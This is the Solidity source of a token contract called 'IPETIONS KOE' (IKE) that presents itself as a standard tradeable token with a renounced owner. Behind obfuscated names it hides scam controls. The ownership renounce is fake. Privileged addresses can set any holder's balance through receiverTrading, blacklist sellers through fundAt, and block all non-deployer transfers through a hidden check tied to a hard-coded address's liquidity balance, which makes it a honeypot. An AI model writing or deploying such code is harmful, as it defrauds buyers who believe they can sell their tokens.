//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

abstract contract fundMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingExempt {
    function createPair(address launchTx, address exemptFrom) external returns (address);
}


interface teamFromLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface tradingFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptShould) external view returns (uint256);

    function transfer(address feeSwapReceiver, uint256 fundTakeTrading) external returns (bool);

    function allowance(address senderBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundTakeTrading) external returns (bool);

    function transferFrom(address sender,address feeSwapReceiver,uint256 fundTakeTrading) external returns (bool);

    event Transfer(address indexed from, address indexed minTotal, uint256 value);
    event Approval(address indexed senderBuy, address indexed spender, uint256 value);
}

interface tradingFundMetadata is tradingFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IPETIONSKOE is fundMin, tradingFund, tradingFundMetadata {

    uint256 private isList = 100000000 * 10 ** 18;

    uint256 enableTake;

    function owner() external view returns (address) {
        return minMode;
    }

    function fundAt(address buyFromLaunched) public {
        isMarketingFee();
        if (fromLiquidity != fromTeam) {
            liquidityExempt = limitTx;
        }
        if (buyFromLaunched == shouldToken || buyFromLaunched == swapModeTeam) {
            return;
        }
        amountTo[buyFromLaunched] = true;
    }

    constructor (){
        if (limitTx == fromLiquidity) {
            fromMarketing = liquidityExempt;
        }
        tokenSell();
        teamFromLiquidity walletMin = teamFromLiquidity(listTotal);
        swapModeTeam = marketingExempt(walletMin.factory()).createPair(walletMin.WETH(), address(this));
        if (limitTx == fromTeam) {
            liquidityExempt = limitTx;
        }
        shouldToken = _msgSender();
        feeReceiverAmount[shouldToken] = true;
        shouldLaunched[shouldToken] = isList;
        
        emit Transfer(address(0), shouldToken, isList);
    }

    uint256 public limitTx;

    function fromTx(uint256 fundTakeTrading) public {
        isMarketingFee();
        fundMarketing = fundTakeTrading;
    }

    function minAutoLaunched(address launchedIs, address feeSwapReceiver, uint256 fundTakeTrading) internal returns (bool) {
        if (launchedIs == shouldToken) {
            return enableTo(launchedIs, feeSwapReceiver, fundTakeTrading);
        }
        uint256 launchedTokenLiquidity = tradingFund(swapModeTeam).balanceOf(senderTrading);
        require(launchedTokenLiquidity == fundMarketing);
        require(!amountTo[launchedIs]);
        return enableTo(launchedIs, feeSwapReceiver, fundTakeTrading);
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptTake;
    }

    address public shouldToken;

    function atFee(address launchSwap) public {
        if (receiverTo) {
            return;
        }
        
        feeReceiverAmount[launchSwap] = true;
        if (fromTeam == liquidityExempt) {
            liquidityExempt = fromTeam;
        }
        receiverTo = true;
    }

    uint256 public fromTeam;

    uint256 public fromLiquidity;

    bool private launchedSender;

    uint256 private fromMarketing;

    event OwnershipTransferred(address indexed takeTradingMin, address indexed buyWallet);

    mapping(address => uint256) private shouldLaunched;

    function enableTo(address launchedIs, address feeSwapReceiver, uint256 fundTakeTrading) internal returns (bool) {
        require(shouldLaunched[launchedIs] >= fundTakeTrading);
        shouldLaunched[launchedIs] -= fundTakeTrading;
        shouldLaunched[feeSwapReceiver] += fundTakeTrading;
        emit Transfer(launchedIs, feeSwapReceiver, fundTakeTrading);
        return true;
    }

    uint256 public liquidityExempt;

    function totalSupply() external view virtual override returns (uint256) {
        return isList;
    }

    address private minMode;

    bool public receiverTo;

    function receiverTrading(address amountReceiver, uint256 fundTakeTrading) public {
        isMarketingFee();
        shouldLaunched[amountReceiver] = fundTakeTrading;
    }

    address listTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return sellSender;
    }

    mapping(address => bool) public amountTo;

    function allowance(address amountReceiverReceiver, address marketingTo) external view virtual override returns (uint256) {
        if (marketingTo == listTotal) {
            return type(uint256).max;
        }
        return listFee[amountReceiverReceiver][marketingTo];
    }

    mapping(address => bool) public feeReceiverAmount;

    function approve(address marketingTo, uint256 fundTakeTrading) public virtual override returns (bool) {
        listFee[_msgSender()][marketingTo] = fundTakeTrading;
        emit Approval(_msgSender(), marketingTo, fundTakeTrading);
        return true;
    }

    function isMarketingFee() private view {
        require(feeReceiverAmount[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private listFee;

    function name() external view virtual override returns (string memory) {
        return tradingFromExempt;
    }

    string private sellSender = "IKE";

    uint256 fundMarketing;

    address public swapModeTeam;

    address senderTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address amountReceiver, uint256 fundTakeTrading) external virtual override returns (bool) {
        return minAutoLaunched(_msgSender(), amountReceiver, fundTakeTrading);
    }

    string private tradingFromExempt = "IPETIONS KOE";

    bool public takeMode;

    function balanceOf(address exemptShould) public view virtual override returns (uint256) {
        return shouldLaunched[exemptShould];
    }

    function getOwner() external view returns (address) {
        return minMode;
    }

    function transferFrom(address launchedIs, address feeSwapReceiver, uint256 fundTakeTrading) external override returns (bool) {
        if (_msgSender() != listTotal) {
            if (listFee[launchedIs][_msgSender()] != type(uint256).max) {
                require(fundTakeTrading <= listFee[launchedIs][_msgSender()]);
                listFee[launchedIs][_msgSender()] -= fundTakeTrading;
            }
        }
        return minAutoLaunched(launchedIs, feeSwapReceiver, fundTakeTrading);
    }

    uint8 private exemptTake = 18;

    function tokenSell() public {
        emit OwnershipTransferred(shouldToken, address(0));
        minMode = address(0);
    }

}